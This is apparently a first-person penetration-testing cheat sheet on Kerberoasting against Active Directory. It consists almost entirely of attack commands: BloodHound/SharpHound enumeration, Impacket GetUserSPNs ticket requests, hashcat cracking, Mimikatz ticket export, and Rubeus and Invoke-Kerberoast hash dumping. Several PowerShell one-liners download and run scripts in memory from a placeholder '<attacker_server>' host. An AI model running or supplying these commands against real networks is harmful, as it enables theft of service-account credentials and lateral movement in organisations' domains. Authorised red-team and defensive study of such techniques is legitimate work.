# <h1 align="center" id="heading">Kerberoasting</h1>
The easiest way to enumerate Kerberoastable users is through BloodHound. I can collect BloodHound graphing information for the target domain in a few ways. The easiest and most accurate way is through SharpHound collection. I prefer to run the collection in memory with the following command:
```powershell
IEX(new-Object System.Net.WebClient).DownloadString("http://<attacker_server>/SharpHound.ps1");Invoke-BloodHound -CollectionMethod All
```
If I have valid domain credentials, I can use the Python collector BloodHound.py. This can be run from any platform that has Python support so I do not need to rely solely on Windows. This comes in handy when I find myself on a Domain-joined linux system. I can use the following command to execute the BloodHound graphing information collection:
```console
bloodhound-python -u <username> -p '<password>' -ns <target ip> -d <domain name> -c all
```
This may or may not work depending on the target system! Once I identify Kerberoastable users, I can perform the attack with the following command:
```console
~/tools/impacket/examples/GetUserSPNs.py -dc-ip <domain controller> <domain>/<user>:<password> -request
```
After obtaining a hash, I can attempt to crack the password with the following command (run from Windows host):
```console
hashcat.exe -m 13100 -a 0 hashes.txt rockyou.txt -O
```
Depending on whether or not the user has a weak password, I may or may not be able to crack the ticket. If not, this is most likely not the way forward for lateral movement! There are also alternate methods of Kerberoasting from within a Windows environment if the tools are available. I can start off by loading PowerView into memory with the following command:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/PowerView.ps1")
```
Next, I can run the following command to obtain the SPN (if available):
```powershell
Get-NetUser -SPN | select serviceprincipalname
```
After I obtain a valid SPN, I can run the following commands to load the TGS into memory:
```powershell
Add-Type -AssemblyName System.IdentityModel 
```
```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/<svcacct.domain.com>"
```
Once the ticket is loaded into memory, I can use the following command to verify that it is available for use:
```powershell
klist
```
If the ticket is available, I can use the following commands to execute Mimikatz to export the ticket to disk (current working directory):
```powershell
.\mimikatz64.exe
```
```powershell
kerberos::list /export
```
I can accomplish this same task with a combination of PowerView, Rubeus, and Invoke-Kerberoast. First I will need to use the following command to load PowerView into memory:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/PowerView.ps1")
```
Next, I will use the following command to request a SPN for a service account:
```powershell
Get-NetUser -SPN "MSSQLSvc/<svcacct.domain.com>"
```
I can now run the following command to execute Rubeus:
```powershell
.\rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Now that I have a valid TGS, I can use the following command to load Invoke-Kerberoast into memory of the target system:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString("http://<attacker_server>/Invoke-Kerberoast.ps1")
```
Once Invoke-Kerberoast has been loaded into memory, I can use the following command to perform the attack:
```powershell
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
